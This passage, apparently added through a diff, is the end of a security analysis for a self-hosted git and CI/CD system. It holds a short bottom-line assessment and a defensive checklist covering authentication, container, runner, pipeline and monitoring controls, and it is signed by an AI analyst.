+BOTTOM LINE: The code is well-architected and the security issues are fixable.
+             The foundation is solid. But you need 2-3 weeks of dedicated
+             security work to make this suitable for anything beyond a
+             completely trusted environment.
+
+
+================================================================================
+APPENDIX: SECURITY CHECKLIST FOR IMPLEMENTATION
+================================================================================
+
+Authentication & Authorization
+  □ User registration with email/password
+  □ Password hashing (bcrypt/argon2)
+  □ JWT-based authentication
+  □ Token refresh mechanism
+  □ Session management
+  □ Password reset flow
+  □ Email verification
+  □ Multi-factor authentication (optional)
+  □ API key management for programmatic access
+  □ OAuth2 integration (optional)
+
+API Security
+  □ All endpoints require authentication
+  □ Authorization checks on all operations
+  □ Input validation on all endpoints
+  □ Output sanitization
+  □ Rate limiting per endpoint
+  □ CORS properly configured
+  □ HTTPS/TLS enforcement
+  □ Security headers (HSTS, CSP, etc.)
+  □ Request size limits
+  □ Timeout configuration
+
+Data Security
+  □ Encryption at rest (database)
+  □ Encryption in transit (TLS)
+  □ Secrets management (not env vars)
+  □ Secrets rotation
+  □ Secure backup strategy
+  □ Data retention policy
+  □ PII handling procedures
+  □ SQL injection protection
+  □ NoSQL injection protection
+  □ LDAP injection protection
+
+Container Security
+  □ Non-root user in containers
+  □ No sudo access
+  □ Minimal base images
+  □ Security scanning of images
+  □ Resource limits (CPU, memory)
+  □ Network policies
+  □ Secrets via Docker secrets
+  □ Read-only filesystem where possible
+  □ Capability dropping
+  □ Seccomp profiles
+
+Git Server Security
+  □ Authentication on all git endpoints
+  □ Per-repo authorization
+  □ Branch protection rules
+  □ Force-push prevention
+  □ Commit signing enforcement
+  □ Pre-receive hooks
+  □ Audit logging of git operations
+  □ Rate limiting on git operations
+
+Runner Security
+  □ Runner authentication (API tokens)
+  □ Runner approval workflow
+  □ Runner sandboxing
+  □ Job isolation
+  □ Resource limits per job
+  □ Audit logging of runner operations
+  □ Secrets isolation per runner
+
+Pipeline Security
+  □ Pipeline authorization
+  □ Docker image allowlist
+  □ Command validation
+  □ Network restrictions
+  □ Resource limits per step
+  □ Pipeline approval workflow
+  □ Audit logging of pipeline runs
+  □ Secrets management in pipelines
+
+Monitoring & Logging
+  □ Structured logging
+  □ Audit logging
+  □ Security event logging
+  □ Centralized log aggregation
+  □ Log retention policy
+  □ Monitoring dashboards
+  □ Alerting on security events
+  □ Anomaly detection
+
+Incident Response
+  □ Incident response plan
+  □ Security contact documented
+  □ Backup and recovery procedures
+  □ Runbooks for common incidents
+  □ Post-incident review process
+
+Compliance & Testing
+  □ OWASP Top 10 addressed
+  □ Regular penetration testing
+  □ Automated security testing
+  □ Dependency scanning
+  □ Code security scanning
+  □ Container vulnerability scanning
+  □ Security training for developers
+  □ Security review in CI/CD
+
+
+================================================================================
+END OF SECURITY ANALYSIS
+================================================================================
+
+Document Version: 1.0
+Last Updated: 2026-01-02
+Analyst: Claude Sonnet 4.5
+Contact: See project maintainers
+
+This document is a living analysis and should be updated as security
+improvements are implemented and new vulnerabilities are discovered.
